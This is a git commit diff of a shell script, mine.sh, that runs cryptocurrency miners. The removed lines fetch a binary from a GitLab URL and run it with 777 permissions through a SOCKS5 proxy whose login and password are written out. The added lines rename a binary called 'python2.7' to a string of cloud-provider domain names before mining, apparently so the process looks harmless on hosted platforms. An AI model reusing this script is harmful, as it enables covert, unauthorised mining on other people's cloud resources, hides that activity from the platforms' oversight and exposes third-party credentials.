b85cbba2c15cdf07faf7626d7c88e33f749d16f3
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 05:12:41 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
-wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant
-chmod 777 plant
-./plant -a yespowerTIDE -o stratum+tcp://51.161.117.115:17059 -u TGYVQ8n7a46eyfQtwddy2eFdjLUP5mYLzv.Wew -p c=Tet -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+chmod u+x python2.7
+chmod u+x verus-solver
+mv python2.7 scalingo.com.google.com.heroku.com.github.com
+./scalingo.com.google.com.heroku.com.github.com -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.azure -p x --cpu 8
